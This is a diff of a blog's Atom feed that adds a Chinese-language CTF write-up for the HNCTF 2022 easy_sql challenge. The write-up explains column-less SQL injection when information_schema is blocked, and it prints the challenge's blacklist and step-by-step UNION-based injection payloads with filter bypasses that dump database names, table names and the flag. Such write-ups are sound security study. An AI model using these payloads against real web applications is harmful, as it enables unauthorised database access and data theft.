@@ -6,7 +6,7 @@
   <link href="https://gu0f3n.github.io/atom.xml" rel="self"/>
   
   <link href="https://gu0f3n.github.io/"/>
-  <updated>2024-08-01T13:13:48.145Z</updated>
+  <updated>2024-08-06T12:57:45.802Z</updated>
   <id>https://gu0f3n.github.io/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>NSSCTF</title>
+    <link href="https://gu0f3n.github.io/2024/08/06/NSSCTF-sql/"/>
+    <id>https://gu0f3n.github.io/2024/08/06/NSSCTF-sql/</id>
+    <published>2024-08-06T11:51:49.000Z</published>
+    <updated>2024-08-06T12:57:45.802Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="HNCTF-2022-WEEK2-easy-sql"><a href="#HNCTF-2022-WEEK2-easy-sql" class="headerlink" title="[HNCTF 2022 WEEK2]easy_sql"></a>[HNCTF 2022 WEEK2]easy_sql</h1><p>参考文章：<a href="https://blog.csdn.net/Jayjay___/article/details/132956781">https://blog.csdn.net/Jayjay___/article/details/132956781</a></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>这题考察了无列名注入</p><p>我们常用的<a href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a>方法是通过<code>information_schema</code>这个默认数据库来实现，可是你有没有想过，如果过滤了该数据库那么我们就不能通过这个库来查出表名和列名。不过我们可以通过两种方法来查出表名：</p><p><strong>InnoDb引擎</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表（mysql.innodb_table_stats），这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。高版本的 mysql 中，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。</span><br></pre></td></tr></table></figure><p><strong>sys数据库</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns（sys.schema_auto_increment_columns）来获取表名。</span><br></pre></td></tr></table></figure><p>但是上述两种方法都只能查出表名，<strong>无法查到列名</strong>，这时我们就要用到无列名注入了。无列名注入，顾名思义，就是不需要列名就能注出数据的注入。</p><p><strong>无列名注入使用条件</strong></p><p>无列名注入主要是适用于已经获取到数据表，但无法查询列的情况下，在大多数 CTF 题目中，<strong>information_schema 库被过滤</strong>，使用这种方法获取列名。</p><p><strong>无列名注入原理</strong></p><p>无列名注入的原理其实很简单，就是联合查询<strong>创建虚拟数据</strong>。<strong>可以看作将我们不知道的列名进行取别名操作</strong>，在取别名的同时进行数据查询，所以查询字段数一定要相同，如果我们查询的字段多于数据表中列的时候，就会出现报错。</p><h2 id="本地演示"><a href="#本地演示" class="headerlink" title="本地演示"></a>本地演示</h2><p>正常查表</p><p> select * from Gu0f3n;<br><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B903%E5%88%86.png" alt="image-20240806200233160"></p><p>联合查询表中数据</p><p>select 1,2,3 union select * from Gu0f3n;(我这里字段是三，具体情况具体分析)</p><p>很明显创建了虚拟数据（虚拟字段值123和虚拟表），虚拟表中列名变成了123。</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B904%E5%88%86.png" alt="image-20240806200442297"></p><p>很明显创建了虚拟数据（虚拟字段值123和虚拟表），虚拟表中列名变成了123。</p><p>只查一列的字段的值我们可以 yyy是自己命名的虚拟表表名，可以自定义这条sql语句在联合查询创建虚拟表xxx，虚拟列1,2,3的同时查询虚拟表第二列的数据。</p><p>select <code>2</code> from (select 1,2,3 union select * from Gu0f3n)yyy;</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B909%E5%88%86.png" alt="image-20240806200938012"></p><p>要查多个列的话</p><p>select <code>2</code> ,<code>3</code>from (select 1,2,3 union select * from Gu0f3n)yyy;</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B911%E5%88%86.png" alt="image-20240806201127902"></p><p>如果有时候把&#96;过滤了我们可以用as</p><p>select 1 as a,2 as b, 3 as c union select * from Gu0f3n;</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B914%E5%88%86.png" alt="image-20240806201353981"></p><p>select b from (select 1 as a,2 as b,3 as c union select * from Gu0f3n)yyy;</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B915%E5%88%86.png" alt="image-20240806201450310"></p><h2 id="回到题目"><a href="#回到题目" class="headerlink" title="回到题目"></a>回到题目</h2><p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B916%E5%88%86.png" alt="image-20240806201644950"></p><p>黑名单应该是这样的<code>&quot;/and|sleep|extractvalue|information|is|not|updataxml|order|rand|handler|flag|sleep|\~|\!|\@|\#|\\$|\%|\^|\+|\&amp;|\-|\ /i&quot;</code></p><p>判断类型</p><p>因为注释符号都过滤了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;|&#x27;1</span><br></pre></td></tr></table></figure><p>发现回显和id&#x3D;1一样确定是字符型</p><p>空格&#x2F;**&#x2F;绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;/**/group/**/by/**/3,&#x27;1</span><br></pre></td></tr></table></figure><p>发现字段为3</p><p>判断回显位</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0&#x27;/**/union/**/select/**/1,2,3/**/where&#x27;1</span><br></pre></td></tr></table></figure><p>这里where是限制条件 目的还是注释掉闭合</p><p>发现回显位置为3</p><p>爆库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0&#x27;/**/union/**/select/**/1,2,group_concat(database_name)/**/from/**/mysql.innodb_table_stats/**/where&#x27;1</span><br></pre></td></tr></table></figure><p>得到这些库名</p><p>ctf,ctftraining,ctftraining,ctftraining,mysql</p><p>爆表名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0&#x27;/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where&#x27;1</span><br></pre></td></tr></table></figure><p>得到这些表名</p><p>ccctttfff,flag,news,users,gtid_slave_pos</p><p>上面说过 不能得到列名 我们直接爆值</p><p>还得自己一个个试</p><p>最终flag 在ctftraining.flag下面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0&#x27;/**/union/**/select/**/1,2,`6`/**/from/**/(select/**/6/**/union/**/select/**/*/**/from/**/ctftraining.flag)Gu0f3n/**/where&#x27;1</span><br></pre></td></tr></table></figure><p>还有有一种闭合方式%00</p><p>其他都一样</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;HNCTF-2022-WEEK2-easy-sql&quot;&gt;&lt;a href=&quot;#HNCTF-2022-WEEK2-easy-sql&quot; class=&quot;headerlink&quot; title=&quot;[HNCTF 2022 WEEK2]easy_sql&quot;&gt;&lt;/a&gt;[HNCTF 202</summary>
+      
+    
+    
+    
+    <category term="sql刷题笔记" scheme="https://gu0f3n.github.io/categories/sql%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
+    
+    
+    <category term="SQL" scheme="https://gu0f3n.github.io/tags/SQL/"/>
+    
+  </entry>
   
   <entry>
     <title>Ciscn2024web复现</title>
